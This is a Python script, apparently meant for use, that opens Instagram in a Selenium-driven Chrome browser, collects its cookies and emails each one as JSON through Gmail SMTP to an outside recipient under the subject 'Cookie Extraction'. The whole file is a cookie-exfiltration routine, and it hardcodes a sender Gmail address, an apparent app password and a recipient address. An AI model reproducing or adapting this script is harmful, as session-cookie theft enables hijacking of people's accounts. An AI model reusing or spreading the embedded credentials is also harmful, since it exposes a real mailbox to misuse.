from selenium import webdriver
import smtplib
import json

# Launch the browser
driver = webdriver.Chrome()
# Open the webpage
driver.get("http://www.instagram.com")

# Retrieve browser cookies
cookies = driver.get_cookies()

# SMTP server configuration
smtp_server = "smtp.gmail.com"
port = 587
sender = "shauravbhandari2@gmail.com"
password = "gmua tqzn sjrx usyb"  # Use an app password for Gmail
recipient = "bhlaxman45@gmail.com"
subject = "Cookie Extraction"

# Start SMTP session and send email
with smtplib.SMTP(smtp_server, port) as mail:
    mail.starttls()  # Encrypt the connection
    mail.login(sender, password)  # Log in with the app password

    for cookie in cookies:
        # Serialize the cookie dictionary into a JSON string
        cookie_str = json.dumps(cookie, indent=2)
        print(cookie_str)  # For debugging purposes
        
        # Construct the email
        header = f"To: {recipient}\nFrom: {sender}\nSubject: {subject}\n\n"
        content = header + f"Cookie details:\n{cookie_str}\n"
        
        # Send the email
        mail.sendmail(sender, recipient, content)

print("Emails sent successfully!")
